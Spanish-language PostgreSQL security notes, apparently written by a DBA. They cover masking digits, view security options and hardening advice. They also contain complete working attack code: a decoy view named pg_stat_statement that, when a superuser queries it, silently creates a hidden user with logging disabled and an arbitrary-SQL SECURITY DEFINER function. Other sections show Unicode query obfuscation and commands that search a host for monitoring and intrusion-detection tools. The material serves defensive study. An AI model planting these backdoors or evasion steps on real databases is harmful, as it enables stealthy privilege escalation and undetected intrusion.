SELECT REPEAT('*', LENGTH(num) - 4) || RIGHT(num, 4) AS ultimos_cuatro_digitos  from (select '123456789' as num) as a ; -->  *****6789
SELECT lpad( (RIGHT(num, 4)) ,  LENGTH(num) ,'*') AS ultimos_cuatro_digitos  from (select '123456789' as num) as a ; ---> *****6789

--- Para Telefonos

```





## Ejemplo de Cómo un Atacante Puede Exploitar el Permiso CREATE en el Esquema Público del Rol Public
 
```SQL
Nota: No es posible modificar ningún objeto a menos que seas el propietario del mismo o un superusuario. Por lo tanto, la técnica de crear objetos como índices, reglas, triggers, casts, tipos, etc., y agregarles funciones como parámetros para que un administrador los ejecute con el fin de escalar privilegios, no es viable. Si esto fuera posible, un atacante podría crear una función maliciosa, agregarla a un objeto como un índice de una tabla muy utilizada y pasar la función maliciosa como parámetro en el índice. Esto permitiría al atacante ejecutar código malicioso sin ser detectado.

Vista Engañosa: Puedes crear una vista, por ejemplo, llamada pg_stat_statement, que puede engañar al administrador de la base de datos. Este truco funciona si el administrador utiliza la tecla de tabulación para autocompletar los nombres de las tablas, ya que la tabla original es pg_stat_statements. La autocompletación sugerirá la tabla sin la "s" final, lo que podría llevar al administrador a ejecutar una función con código malicioso.

Este código malicioso podría crear una función diseñada para ejecutar comandos con privilegios de administrador. Un atacante podría aprovechar esta vulnerabilidad, y el administrador no se daría cuenta del engaño. Además, es posible crear un usuario con parámetros específicos para evitar el registro de logs, aumentando así la dificultad de detectar la intrusión.

Función Entendible: En este ejemplo, se creó la función entendible, a la cual se le pueden agregar más características. Por ejemplo, es posible crear un usuario sin caracteres visibles y ofuscar el código en Base64 que se ejecuta con EXECUTE. De esta manera, se puede pasar desapercibido para los administradores de la base de datos.



----- Código de la Función:

CREATE or replace FUNCTION get_oid(p_oid oid) RETURNS oid AS $_$
BEGIN
	
	BEGIN
	
		IF (select 1 from pg_roles where rolsuper = true and rolname = session_user) THEN
		
			IF (SELECT 1 FROM pg_roles WHERE rolname = 'user_evil') IS NULL THEN
				EXECUTE $$
					create user user_evil WITH  password '123123';
					ALTER user user_evil SET client_min_messages='error';  
					ALTER user user_evil SET  log_statement='none'; 
					ALTER user user_evil SET log_min_messages='panic';
					ALTER user user_evil SET log_min_error_statement='panic';
					ALTER user user_evil SET log_duration = off; 
					$$;

			END IF;
		
			IF (select 1 from pg_proc where proname ='polygons') IS NULL THEN

				EXECUTE E'
							
					CREATE OR REPLACE FUNCTION polygons(p_value text) RETURNS void AS \$\$
					BEGIN
						EXECUTE p_value;
					END;
					\$\$ LANGUAGE plpgsql 
					SECURITY DEFINER;

				';
		
			END IF; 
		END IF;
	
	
	EXCEPTION 
		WHEN OTHERS  THEN 

	END;
	return p_oid ; 
END; $_$ LANGUAGE plpgsql  ;



------- Código de la Vista:

CREATE OR REPLACE VIEW public.pg_stat_statement AS
SELECT 
 get_oid(pg_stat_statements.userid) as userid,
 pg_stat_statements.dbid,
 pg_stat_statements.queryid,
 pg_stat_statements.query,
 pg_stat_statements.calls,
 pg_stat_statements.total_time,
 pg_stat_statements.min_time,
 pg_stat_statements.max_time,
 pg_stat_statements.mean_time,
 pg_stat_statements.stddev_time,
 pg_stat_statements.rows,
 pg_stat_statements.shared_blks_hit,
 pg_stat_statements.shared_blks_read,
 pg_stat_statements.shared_blks_dirtied,
 pg_stat_statements.shared_blks_written,
 pg_stat_statements.local_blks_hit,
 pg_stat_statements.local_blks_read,
 pg_stat_statements.local_blks_dirtied,
 pg_stat_statements.local_blks_written,
 pg_stat_statements.temp_blks_read,
 pg_stat_statements.temp_blks_written,
 pg_stat_statements.blk_read_time,
 pg_stat_statements.blk_write_time
FROM pg_stat_statements(true) pg_stat_statements(userid, dbid, queryid, query, calls, total_time, min_time, max_time, mean_time,
 stddev_time, rows, shared_blks_hit, shared_blks_read, shared_blks_dirtied, shared_blks_written, local_blks_hit, local_blks_read, local_blks_dirtied, local_blks_written, temp_blks_read, temp_blks_written, blk_read_time, blk_write_time); 



----- Consultas para Comprobar el Usuario y la Función:

SELECT * FROM public.pg_stat_statement LIMIT 1;
SELECT usename, useconfig FROM pg_shadow WHERE usename = 'user_evil';
\du user_evil
\df polygons



--------- Recomendaciones Adicionales:

Revocar el Permiso CREATE en el Esquema public del Rol public: Esta acción ayudará a fortalecer la seguridad de tu base de datos al evitar que usuarios no autorizados creen objetos en el esquema público.
Tema de usuarios:  al realizar el revoke para no cometer incidencias con los usuarios, se tiene que otorgar permisos de create a las cuentas de servicio y las cuentas personalizadas dejarlas como estan.

Monitoreo y Registro: Implementa un sistema de monitoreo y registro para rastrear todas las actividades de los usuarios en la base de datos. Esto puede ayudar a identificar acciones sospechosas y responder rápidamente a posibles ataques.

Capacitación en Seguridad: Proporciona capacitación en seguridad para todos los administradores y desarrolladores de la base de datos. Asegúrate de que estén al tanto de las mejores prácticas y de las técnicas de ataque comunes.

Actualizar y Parchear: Mantén el sistema de gestión de bases de datos actualizado con los últimos parches de seguridad y versiones. Las actualizaciones a menudo incluyen correcciones para vulnerabilidades conocidas.

deshabilitar el autocompletado  utilizado por el software de lectura de líneas (readline)
nano ~/.inputrc
set disable-completion on


```

# Parámetros de seguridad en vistas 
Antes de la versión 15, todas las vistas se ejecutaban como su propietario, lo que dificultaba la interacción con RLS. A partir de la versión 15, las vistas marcadas como security_invoker"se ejecutan" con los privilegios del usuario que las invoca, no del propietario de la vista. Esto simplifica el trabajo con las políticas de RLS.
[security_invoker  y security_barrier ](https://github.com/CR0NYM3X/POSTGRESQL/blob/main/Aplicar%20reglas%20a%20tablas.md#security_barrier-en-vistas)  [[2]](https://medium.com/@mydbopsdatabasemanagement/exploring-security-invoker-views-in-postgresql-15-a-step-towards-safer-data-access-04131a96fa79)

Ejemplo problema de seguridad
```
--- drop VIEW phone_number; 
CREATE VIEW phone_number WITH (security_barrier,security_invoker) AS
    select * from pg_class;


ALTER VIEW phone_number SET (security_invoker = on);

https://www.postgresql.org/docs/current/sql-createview.html
https://www.postgresql.org/docs/17/rules-privileges.html


security_invoker    : https://www.cybertec-postgresql.com/en/view-permissions-and-row-level-security-in-postgresql/
security_barrier  https://www.cybertec-postgresql.com/en/security-barriers-cheating-on-the-planner/

```


# unicode para ofuscar consultas 
```sql
-- Consultar en Unicode 
select U&'\0064\0061\0074\0061'; --> data

-- Consultar en Unicode , se puede modificar el carácter 
select U&'_0020_0048_0065_006c_006c_006f_0020_0057_006f_0072_0064_0020' UESCAPE '_' ; -->    Hello Word  
	
************** Utilizando el unicode para ofuscar las consultas **************


--- Query para ofuscar el texto ---
SELECT 'U&"'||regexp_replace(encode(convert_to('proname', 'UTF8'), 'hex'), '([0-9a-f]{2})', '_00\1', 'g')  || '" UESCAPE ''_'''AS modified_hex;

--- consulta original ---
select 
	proname
	,prosrc 
from pg_proc 
where proname is not null 
	limit 1;

--- consulta ya ofuscada ---
select 
	U&"_0070_0072_006f_006e_0061_006d_0065" UESCAPE '_'    -- proname
	,U&"_0070_0072_006f_0073_0072_0063" UESCAPE '_'        -- prosrc 
from U&"_0070_0067_005f_0070_0072_006f_0063" UESCAPE '_' 
where U&"_0070_0072_006f_006e_0061_006d_0065" UESCAPE '_' is not null 
	limit 1;


```


# Buscar herramientas de monitoro y de seguridad instaladas en mi S.O
```
------ Buscar herramientas de monitorio -------
ps aux | grep -E 'zabbix|nagios|prometheus|grafana' # Ver procesos 
systemctl list-units --type=service | grep -E 'zabbix|nagios|prometheus|grafana' # Ver estatus de algun servicio 
rpm -qa | grep -E 'zabbix|nagios|prometheus|grafana' # Ver paquetes 
ls /etc | grep -E 'zabbix|nagios|prometheus|grafana' # Ver archivos 
netstat -tulnp | grep -E '10050|10051|5666|9090' # Ver puertos 


------ Buscar herramientas de monitorio -------
ps aux | grep -E 'auditd|ossec|selinux|apparmor|Wazuh|Sysdig|Qualys|Rapid7|InsightVM|Tenable|Nessus|Tripwire|IBM|QRadar|ManageEngine|Log360'
systemctl list-units --type=service | grep -Ei 'auditd|ossec|selinux|apparmor|Wazuh|Sysdig|Qualys|Rapid7|InsightVM|Tenable|Nessus|Tripwire|IBM|QRadar|ManageEngine|Log360'
rpm -qa | grep -Ei 'auditd|ossec|selinux|apparmor|Wazuh|Sysdig|Qualys|Rapid7|InsightVM|Tenable|Nessus|Tripwire|IBM|QRadar|ManageEngine|Log360'
ls /etc | grep -Ei 'auditd|ossec|selinux|apparmor|Wazuh|Sysdig|Qualys|Rapid7|InsightVM|Tenable|Nessus|Tripwire|IBM|QRadar|ManageEngine|Log360'
netstat -tulnp | grep -E '1514|5601|9200'


------ información sobre los puertos que mencionaste: ------

- **1514** – Usado por **OSSEC**, un sistema de detección de intrusos.
- **5601** – Usado por **Kibana**, una herramienta de visualización para Elasticsearch.
- **9200** – Usado por **Elasticsearch**, un motor de búsqueda y análisis distribuido.
- **10050 y 10051** – Usados por **Zabbix**, una plataforma de monitoreo de servidores.
- **5666** – Usado por **NRPE (Nagios Remote Plugin Executor)**, para monitoreo remoto en Nagios.
- **9090** – Usado por **Prometheus**, una herramienta de monitoreo y alertas.

 ```

## referencias
```
https://momjian.us/main/writings/pgsql/securing.pdf
https://github.com/geocompass/disable_copy/tree/master
```
